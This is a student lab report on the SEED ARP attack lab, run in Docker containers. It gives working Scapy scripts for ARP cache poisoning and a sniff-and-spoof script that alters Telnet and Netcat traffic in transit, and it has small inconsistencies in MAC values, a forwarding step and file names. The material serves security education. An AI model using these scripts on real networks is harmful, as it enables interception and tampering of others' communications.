# Lab 5: AITM 2

Fifth laboratory for the **Cybersecurity Laboratory** course.

**Objective:** To follow the [**SEED Lab on ARP attacks**](https://seedsecuritylabs.org/Labs_20.04/Files/ARP_Attack/ARP_Attack.pdf) and describe the performed steps and the observed results.

## Introduction

### Lab aim

The objective of this laboratory was to execute and document an **ARP attack** following the SEED Lab guide. The tasks to complete were:

* [ARP cache poisoning](#task-1-arp-cache-poisoning)
* [AITM attack on Telnet](#task-2-aitm-attack-on-telnet)
* [AITM attack on Netcat](#task-3-aitm-attack-on-netcat)

### Set up VM

The host machine used for the set up was a MacBook with an M3 processor. The [corresponding guide](https://github.com/seed-labs/seed-labs/blob/master/lab-setup/apple-arm/seedvm-fusion.md) was followed, which involved:

* downloading **VMware Fusion**
* downloading **Ubuntu ISO** and installing it

However, even if the installation was successful, the VM did not boot correctly. So to execute the lab, multiple SSH sessions connected to the virtual machine were opened.

After that, the setup for the lab was downloaded and the containers built.

```bash
docker compose up --build
```

The three machines involved in the lab were **A**, **B** and **M**.

<img src="images/Screenshot 2026-07-03 alle 10.40.53.png" alt=" " style="zoom:80%;" />

Then, to execute the lab, the following command was executed to access to the shell of each container.

```bash
sudo docker exec -it <container-name> bash
```

With `ifconfig`, the MAC addresses of each machine can be found and annotated.

| Container | IP           | MAC                 |
| --------- | ------------ | ------------------- |
| A         | `10.9.0.5`   | `7e:57:d4:2f:9e:41` |
| B         | `10.9.0.6`   | `9e:a9:72:57:7e:3a` |
| M         | `10.9.0.105` | `fe:02:22:8c:1a:a0` |

## Task 1: ARP Cache Poisoning

The first task of the lab involved executing **ARP Cache Poisoning**.

### Task 1.a

The first goal was to construct an **ARP request packet** in order to map B's IP with M's MAC address. 

In the folder `/volumes` the script `task1a.py` was written.

```python
#!/usr/bin/env python3
from scapy.all import *

A = ARP()
A.op = 1 # 1 for ARP request; 2 for ARP reply
A.psrc = "10.9.0.6" # B-IP
A.pdst = "10.9.0.5" # A-IP


E = Ether()
E.src = "fe:02:22:8c:1a:a0" # M-MAC
E.dst = "7e:57:d4:2f:9e:41" # A-MAC

pkt = E/A
sendp(pkt)
```

Then it was executed from M and the packet was sent to A.

```bash
python3 task1a.py
```

The task was successful, which was evident by analysing A's arp cache. 

<img src="images/Screenshot 2026-07-03 alle 10.51.08.png" style="zoom:100%;" />

### Task 1.b

The second task was similar, but using an **ARP reply packet** and checking if it was successful in two different scenarios: IP of B is in A's cache or A's cache empty.

The script `task1b.py` in this case was different only on line 5, to indicate that the packet is an ARP reply instead of a request.

```python
#!/usr/bin/env python3
from scapy.all import *

A = ARP()
A.op = 2 # 1 for ARP request; 2 for ARP reply
A.psrc = "10.9.0.6" # B-IP
A.pdst = "10.9.0.5" # A-IP


E = Ether()
E.src = "fe:02:22:8c:1a:a0" # M-MAC
E.dst = "7e:57:d4:2f:9e:41" # A-MAC

pkt = E/A
sendp(pkt)
```

Then, A's ARP cache is emptied with the following command.

```bash
ip -s -s neigh flush all
```

#### Scenario 1

A pings B, so that B's IP is contained in A's cache. By executing the script from M, the ARP poisoning was successful, because the IP is updated with M's MAC address. 

<img src="images/Screenshot 2026-07-03 alle 11.53.32.png" alt=" " style="zoom:80%;" />

#### Scenario 2

Instead, if A's cache is empty, it remains empty. This is due to the fact that the OS ignores ARP replies when no request has been sent, if the corresponding IP is not present in the cache.

### Task 1.c

The last task involved sending an **ARP gratuitous** message and observe what happens in the same 2 scenarios as Task 1.b.

> An ARP gratuitous packet is a special ARP request packet that's used to update the information on all other machines' ARP cache (for example at reboot).
>
> * The source and destination IP are both the address of the sender
> * The destination MAC address is the broadcast (`ff:ff:ff:ff:ff:ff`)

The following script `task1c.py` was written following these specifics.

```python
#!/usr/bin/env python3
from scapy.all import *

A = ARP()
A.op = 1 # 1 for ARP request; 2 for ARP reply
A.psrc = "10.9.0.6"
A.pdst = "10.9.0.6"


E = Ether()
E.src = "fe:02:22:8c:1a:a0"
E.dst = "ff:ff:ff:ff:ff:ff"

pkt = E/A
sendp(pkt)
```

The results in both scenarios were exactly as in Task 1.b. This makes sense given that if there's no IP in A's cache, there's no need to update that entry.

## Task 2: AITM Attack on Telnet

For Task 2, the goal was to intercept communication between A and B and change the packet payload.

<img src="images/Screenshot 2026-07-03 alle 09.45.56.png" alt=" " style="zoom:60%;" />

### Step 1

First, the script `poisonAB.py` was written and launched from M: it executes an ARP cache poisoning attack as in Task 1, by sending an ARP request to both A and B every 5 seconds. This will update the existing ARP cache, as seen in Task 1.a.

```python
#!/usr/bin/env python3
from scapy.all import *

A1 = ARP()
A1.op = 1 # 1 for ARP request; 2 for ARP reply
A1.psrc = "10.9.0.6"
A1.pdst = "10.9.0.5"


E1 = Ether()
E1.src = "fe:02:22:8c:1a:a0" # M
E1.dst = "7e:57:d4:2f:9e:41" # A

pkt1 = E1/A1

A2 = ARP()
A2.op = 1 # 1 for ARP request; 2 for ARP reply
A2.psrc = "10.9.0.5"
A2.pdst = "10.9.0.6"


E2 = Ether()
E2.src = "fe:02:22:8c:1a:a0" # M
E2.dst = "9e:a9:72:57:7e:3a" # B

pkt2 = E2/A2

while True:
        sendp(pkt1)
        sendp(pkt2)
        time.sleep(5)
```

### Step 2

For the next step, A and B had to ping each other with IP forwarding on host M turned off. This can be done with the following command.

```bash
sysctl net.ipv4.ip_forward=0
```

With  forwarding off, M received the packets from A, but did not forward them to B. Therefore, A didn't receive a reply. This can be seen both by the ping statistics and by analysing the traffic with `tshark`.

#### Ping statistics

In the ping statistics the packet loss is very high: the majority of the packets are received by M and ignored. However, some of the packets (in this case exactly 4) are received by B, since it returns a reply to A. This could be due to the fact that in the 5 seconds interval, before the next ARP poisoning, A is able to obtain the real MAC address of B.

<img src="images/Screenshot 2026-07-03 alle 12.10.03.png" style="zoom:60%;" />

#### Tshark

By using `tshark` on the Docker bridge that connects all the SEED containers, the traffic between containers can be observed.

```bash
sudo tshark -i br-cc08238ff968
```

From here, it can be observed that the requests from A receive no reply. 

<img src="images/Screenshot 2026-07-03 alle 12.17.17.png" alt=" " style="zoom:50%;" />

In between the many ARP requests that are sent by M, a genuine ARP request from A and replied by B can be seen. This allows for the (very brief) `ICMP` communication between A and B, before M sends again the malicious requests.

<img src="images/Screenshot 2026-07-03 alle 12.24.27.png" alt=" " style="zoom:50%;" />

The same result is obtained by doing the experiment the other way around, with B pinging A.

### Step 3

By turning on forwarding, with the following command, the packets can be examined again.

```bash
sysctl net.ipv4.ip_forward=1
```

Now, the behaviour is different. The packets are seen being redirected by M to B.

#### Ping statistics

From the ping statistics, it can be seen that none of the packets are lost. They're redirected from M to B.

<img src="images/Screenshot 2026-07-03 alle 12.31.58.png" alt=" " style="zoom:50%;" />



#### Tshark

This is also evident by analysing the traffic.

<img src="images/Screenshot 2026-07-03 alle 12.30.12.png" alt=" " style="zoom:50%;" />

With forwarding on, M acts as an AITM between A and B.

### Step 4

Now, the entire attack on Telnet can be executed. Initially, M allows forwarding. This way A can establish telnet connection with B.

```bash
sysctl net.ipv4.ip_forward=1
```

Then A connects to B using `telnet`, then enters username (`seed`) and password (`dees`).

```bash
telnet 10.9.0.6
```

Now every character written by A is sent inside TCP packets to B's IP address, which is associated with M's MAC address. M then transmits them to B, since forwarding is turned on. From A's point of view, everything works normally.

<img src="images/Screenshot 2026-07-02 alle 22.41.15.png" alt="Screenshot 2026-07-02 alle 22.41.15" style="zoom:50%;" />

The following `snifandspoof.py` script is written for M, following the SEED guide. 

* **A → B**: This script intercepts packets from A and transforms the characters to the letter `"Z"`.
* **B → A**: The packets sent from B back to A are not changed and just forwarded.

```python
#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.inet import IP, TCP

IP_A = "10.9.0.5"
MAC_A = "9e:a9:72:57:7e:3a"

IP_B = "10.9.0.6"
MAC_B = "7e:57:d4:2f:9e:41"

MAC_M = "fe:02:22:8c:1a:a0"


def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].payload
        del newpkt[TCP].chksum
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load 
            newdata = data if data[0] == 0xFF else 'Z'
            send(newpkt / newdata)
        else:
            send(newpkt)
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt)


f = f"tcp and not ether src {MAC_M}"
pkt = sniff(iface="eth0", filter = f, prn = spoof_pkt)
```

From M then forwarding is turned on and the script executed.

```bash
sysctl net.ipv4.ip_forward=0
python3 snifnspoof.py 
```

The attack works: writing anything on A's terminal results in just Z letters.

<img src="images/Screenshot 2026-07-02 alle 22.41.38.png" alt=" " style="zoom:50%;" />

## Task 3: AITM Attack on Netcat

Finally, a similar attack was performed using Netcat instead of Telnet.

Firstly, B opens a Netcat server with `nc -lp 9090`. A connects to B with `nc 10.9.0.6 9090`

With IP forwarding enabled on M, everything works normally.

<img src="images/Screenshot 2026-07-02 alle 22.49.59.png" alt=" " style="zoom:60%;" /><img src="images/Screenshot 2026-07-02 alle 22.50.03.png" alt=" " style="zoom:60%;" />

As in Task 2, forwarding is turned off and the same `snifnspoof.py` script is executed from M's machine, with the only difference being in how the data is transformed. The string `"anna"` is replaced with `"AAAA"`.

```python
newdata = data.replace(b"anna", b"AAAA")
```

The attack is successful: any occurrence of the name is replaced before reaching B.

<img src="images/Screenshot 2026-07-02 alle 23.01.36.png" alt=" " style="zoom:60%;" /><img src="images/Screenshot 2026-07-02 alle 23.01.42.png" alt=" " style="zoom:60%;" />

